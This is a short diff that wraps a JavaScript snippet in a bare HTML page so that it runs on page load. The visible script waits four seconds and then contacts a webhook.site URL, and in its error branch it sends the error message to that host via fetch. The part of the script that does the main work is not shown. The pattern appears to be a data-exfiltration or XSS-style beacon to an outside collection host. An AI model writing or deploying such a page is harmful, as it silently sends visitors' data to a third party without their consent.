@@ -1,3 +1,7 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
 const h = "https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525";
 setTimeout(() => {
   try {
@@ -11,3 +15,6 @@ setTimeout(() => {
     fetch(h + "?fail=" + encodeURIComponent(e.message));
   }
 }, 4000);
+</script>
+</body>
+</html>
